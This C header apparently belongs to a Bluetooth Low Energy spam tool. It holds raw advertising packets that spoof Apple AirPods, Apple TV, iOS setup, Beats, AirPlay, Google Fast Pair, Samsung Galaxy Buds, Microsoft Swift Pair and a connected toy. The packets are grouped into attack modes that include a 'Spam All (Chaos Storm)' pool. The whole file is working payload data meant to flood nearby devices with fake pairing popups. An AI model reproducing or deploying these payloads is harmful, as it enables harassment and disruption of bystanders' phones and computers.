#pragma once

#include <stdint.h>
#include <stddef.h>

typedef struct {
    const char* name;
    const uint8_t* data;
    size_t size;
} BlePayload;

typedef struct {
    const char* category_name;
    const BlePayload* payloads;
    size_t count;
} BleMode;

// --- Apple Proximity Payloads ---
static const uint8_t AIRPODS_PAYLOAD[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x82, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t APPLE_TV_SETUP[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x54, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t IOS_SETUP_PAYLOAD[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x02, 0x0b, 0x20, 0x55, 0xaa, 0x20, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x82, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t BEATS_SOLO_PAYLOAD[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x82, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t AIRPLAY_TARGET_PAYLOAD[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x42, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// --- Android / Google Fast Pair & Audio ---
static const uint8_t FASTPAIR_PAYLOAD[] = {
    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0x80, 0x83, 0x00
};

static const uint8_t SAMBUDS_PAYLOAD[] = {
    0x05, 0x16, 0x12, 0x01, 0x00, 0x00
};

// --- Windows Swift Pair ---
static const uint8_t SWIFTPAIR_PAYLOAD[] = {
    0x03, 0x03, 0x03, 0x00, 0x12, 0x16, 0x03, 0x00, 0x80, 0x01, 0x00
};

// --- Smart Devices / Accessories ---
static const uint8_t LOVESPOUSE_PAYLOAD[] = {
    0x03, 0x03, 0x12, 0x18, 0x0F, 0x16, 0x12, 0x18, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05
};

static const BlePayload APPLE_PAYLOADS[] = {
    {"Apple AirPods", AIRPODS_PAYLOAD, sizeof(AIRPODS_PAYLOAD)},
    {"Apple TV Setup", APPLE_TV_SETUP, sizeof(APPLE_TV_SETUP)},
    {"iOS Setup Popup", IOS_SETUP_PAYLOAD, sizeof(IOS_SETUP_PAYLOAD)},
    {"Beats Solo Pro", BEATS_SOLO_PAYLOAD, sizeof(BEATS_SOLO_PAYLOAD)},
    {"AirPlay Target", AIRPLAY_TARGET_PAYLOAD, sizeof(AIRPLAY_TARGET_PAYLOAD)}
};

static const BlePayload ANDROID_PAYLOADS[] = {
    {"Google Fast Pair", FASTPAIR_PAYLOAD, sizeof(FASTPAIR_PAYLOAD)},
    {"Samsung Galaxy Buds", SAMBUDS_PAYLOAD, sizeof(SAMBUDS_PAYLOAD)}
};

static const BlePayload WINDOWS_PAYLOADS[] = {
    {"Microsoft Swift Pair", SWIFTPAIR_PAYLOAD, sizeof(SWIFTPAIR_PAYLOAD)}
};

static const BlePayload OTHER_PAYLOADS[] = {
    {"Smart Toy / Device", LOVESPOUSE_PAYLOAD, sizeof(LOVESPOUSE_PAYLOAD)}
};

// Comprehensive Chaos Storm Pool (All types combined)
static const BlePayload STORM_POOL[] = {
    {"Apple AirPods", AIRPODS_PAYLOAD, sizeof(AIRPODS_PAYLOAD)},
    {"Apple TV Setup", APPLE_TV_SETUP, sizeof(APPLE_TV_SETUP)},
    {"iOS Setup Popup", IOS_SETUP_PAYLOAD, sizeof(IOS_SETUP_PAYLOAD)},
    {"Beats Solo Pro", BEATS_SOLO_PAYLOAD, sizeof(BEATS_SOLO_PAYLOAD)},
    {"AirPlay Target", AIRPLAY_TARGET_PAYLOAD, sizeof(AIRPLAY_TARGET_PAYLOAD)},
    {"Google Fast Pair", FASTPAIR_PAYLOAD, sizeof(FASTPAIR_PAYLOAD)},
    {"Samsung Galaxy Buds", SAMBUDS_PAYLOAD, sizeof(SAMBUDS_PAYLOAD)},
    {"Microsoft Swift Pair", SWIFTPAIR_PAYLOAD, sizeof(SWIFTPAIR_PAYLOAD)},
    {"Smart Toy / Device", LOVESPOUSE_PAYLOAD, sizeof(LOVESPOUSE_PAYLOAD)}
};

static const BleMode BLE_MODES[] = {
    {"Apple Ecosystem", APPLE_PAYLOADS, 5},
    {"Android & Audio", ANDROID_PAYLOADS, 2},
    {"Windows Devices", WINDOWS_PAYLOADS, 1},
    {"Smart Accessories", OTHER_PAYLOADS, 1},
    {"Spam All (Chaos Storm)", STORM_POOL, 9}
};
